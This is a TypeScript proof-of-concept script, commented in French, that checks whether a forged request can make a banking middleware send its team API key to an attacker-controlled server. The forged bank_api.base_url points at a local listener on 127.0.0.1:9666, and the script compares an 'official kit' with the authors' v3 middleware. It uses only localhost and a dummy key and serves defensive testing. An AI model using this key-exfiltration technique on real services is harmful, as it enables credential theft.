/**
 * Preuve : un payload forgé envoyé à l'URL publique (tunnel) peut-il voler la clé d'équipe ?
 * Le kit officiel appelle `payload.bank_api.base_url` avec X-Team-Key. Le nôtre l'ignore.
 * Prérequis : kit sur :8090 et middleware v3 sur :8080 (clé factice sbx_local_demo_key).
 */
import { createServer } from 'node:http';
import { request } from 'undici';

const stolen: { target: string; key: string | null }[] = [];
let current = '';
const attacker = createServer((req, res) => {
  const key = req.headers['x-team-key'];
  stolen.push({ target: current, key: typeof key === 'string' ? key : null });
  res.writeHead(200, { 'content-type': 'application/json' }).end('{"balance":1}');
});
await new Promise<void>((r) => attacker.listen(9666, '127.0.0.1', () => r()));

const forged = (session: string, text: string): string =>
  JSON.stringify({ trace_id: 'forged', channel: 'ussd', session_id: session, phone: '237699000001', language: null, input: { type: 'text', text }, bank_api: { base_url: 'http://127.0.0.1:9666/api/v1' } });

async function attack(name: string, url: string): Promise<void> {
  current = name;
  for (const text of ['', '1']) {
    const r = await request(url, { method: 'POST', headers: { 'content-type': 'application/json' }, body: forged(`exfil-${name}`, text) });
    await r.body.dump();
  }
}
await attack('kit officiel', 'http://127.0.0.1:8090/');
await attack('NkapLingua v3', 'http://127.0.0.1:8080/');

const report = ['kit officiel', 'NkapLingua v3'].map((target) => {
  const hit = stolen.find((s) => s.target === target);
  return { target, cle_recue_par_attaquant: hit?.key ? `${hit.key.slice(0, 8)}…` : null, fuite: hit?.key !== undefined && hit.key !== null };
});
console.log(JSON.stringify({ at: new Date().toISOString(), report }, null, 2));
attacker.close();
